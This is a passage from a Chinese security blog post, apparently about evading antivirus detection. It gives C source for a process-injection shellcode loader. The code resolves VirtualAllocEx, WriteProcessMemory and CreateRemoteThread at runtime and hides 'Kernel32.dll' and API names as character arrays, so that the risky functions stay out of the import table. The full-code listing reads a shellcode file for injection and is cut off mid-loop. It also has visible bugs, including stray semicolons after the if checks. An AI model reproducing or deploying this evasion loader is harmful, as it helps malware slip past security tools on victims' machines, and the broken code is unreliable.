    typedef LPVOID(WINAPI* Virtual_AllocEx)( 
       _In_ HANDLE hProcess, 
       _In_opt_ LPVOID lpAddress, 
       _In_ SIZE_T dwSize, 
       _In_ DWORD flAllocationType, 
       _In_ DWORD flProtect 
    ); 
    typedef BOOL (WINAPI* ImportWriteProcessMemory)( 
       _In_ HANDLE hProcess, 
       _In_ LPVOID lpBaseAddress, 
       _In_reads_bytes_(nSize) LPCVOID lpBuffer, 
       _In_ SIZE_T nSize, 
       _Out_opt_ SIZE_T* lpNumberOfBytesWritten 
    ); 
    typedef HANDLE (WINAPI* ImportCreateRemoteThread)( 
       _In_ HANDLE hProcess, 
       _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, 
       _In_ SIZE_T dwStackSize, 
       _In_ LPTHREAD_START_ROUTINE lpStartAddress, 
       _In_opt_ LPVOID lpParameter, 
       _In_ DWORD dwCreationFlags, 
       _Out_opt_ LPDWORD lpThreadId 
    );
       //避免高危字符串
       char ker32[] = { 'K','e','r','n','e','l','3','2','.','d','l','l',0 }; 
       HMODULE hKer32 = LoadLibraryA(ker32); 
       char VAllocEx[] = { 'V','i','r','t','u','a','l','l','o','c','E','x',0}; 
       Virtual_AllocEx V_AllocEx = (Virtual_AllocEx)GetProcAddress(hKer32, VAllocEx);
    //ImportVirtualAllocEx MyVirtualAllocEx = //(ImportVirtualAllocEx)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "VirtualAllocEx"); 
    ImportWriteProcessMemory MyWriteProcessMemory = (ImportWriteProcessMemory)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "WriteProcessMemory"); 
    ImportCreateRemoteThread MyCreateRemoteThread = (ImportCreateRemoteThread)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "CreateRemoteThread");
修改后查看一下导入表，高危函数已不在iat中了  
完整代码
    #include  
    #include  
    #include  
    #include  
    typedef LPVOID(WINAPI* ImportVirtualAllocEx)( 
       _In_ HANDLE hProcess, 
       _In_opt_ LPVOID lpAddress, 
       _In_ SIZE_T dwSize, 
       _In_ DWORD flAllocationType, 
       _In_ DWORD flProtect 
       ); 
    typedef BOOL(WINAPI* ImportWriteProcessMemory)( 
       _In_ HANDLE hProcess, 
       _In_ LPVOID lpBaseAddress, 
       _In_reads_bytes_(nSize) LPCVOID lpBuffer, 
       _In_ SIZE_T nSize, 
       _Out_opt_ SIZE_T* lpNumberOfBytesWritten 
       ); 
    typedef HANDLE(WINAPI* ImportCreateRemoteThread)( 
       _In_ HANDLE hProcess, 
       _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, 
       _In_ SIZE_T dwStackSize, 
       _In_ LPTHREAD_START_ROUTINE lpStartAddress, 
       _In_opt_ LPVOID lpParameter, 
       _In_ DWORD dwCreationFlags, 
       _Out_opt_ LPDWORD lpThreadId 
       ); 
    void code(LPCSTR lnFileName) { 
       //char ker32[] = { 'K','E','r','n','e','l','3','2','.','d','l','l',0 }; 
       //HMODULE hKer32 = LoadLibraryA(ker32); 
       //char VAllocEx[] = { 'V','i','r','t','u','a','l','l','o','c','E','x',0 }; 
       //Virtual_AllocEx V_AllocEx = (Virtual_AllocEx)GetProcAddress(hKer32, "VirtualAllocEx"); 
       ImportVirtualAllocEx MyVirtualAllocEx = (ImportVirtualAllocEx)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "VirtualAllocEx"); 
       ImportWriteProcessMemory MyWriteProcessMemory = (ImportWriteProcessMemory)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "WriteProcessMemory"); 
       ImportCreateRemoteThread MyCreateRemoteThread = (ImportCreateRemoteThread)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "CreateRemoteThread"); 
       HANDLE openinfile = CreateFileA( 
           //"e:\\calc.bin", 
           lnFileName, 
           GENERIC_READ, 
           0, 
           NULL, 
           OPEN_EXISTING, 
           FILE_ATTRIBUTE_NORMAL, 
           NULL);
       if (openinfile == INVALID_HANDLE_VALUE); 
       { 
           printf("CreateFile Error:%d\n", GetLastError()); 
       } 
       // 
       int size = GetFileSize(openinfile, NULL); 
       if (size == INVALID_FILE_SIZE); 
       { 
           printf("GetFileSize Error:%d\n", GetLastError()); 
       } 
       // 
       char* buf = (char*)malloc(size + 1); 
       DWORD lpNumberOfBytesRead = 0; 
       // 
       BOOL rfile = ReadFile( 
           openinfile, 
           buf, 
           size, 
           &lpNumberOfBytesRead, 
           NULL); 
       for (int i = 0; i   
# 0x05 后记
不足之处欢迎师傅们指点和纠正，感谢给予帮助和支持的朋友，最后谢谢你。  
声明：本文章经用于经验及交流，严禁用于非法操作，出现后果一切自行承担，阅读此文章表示你已同意。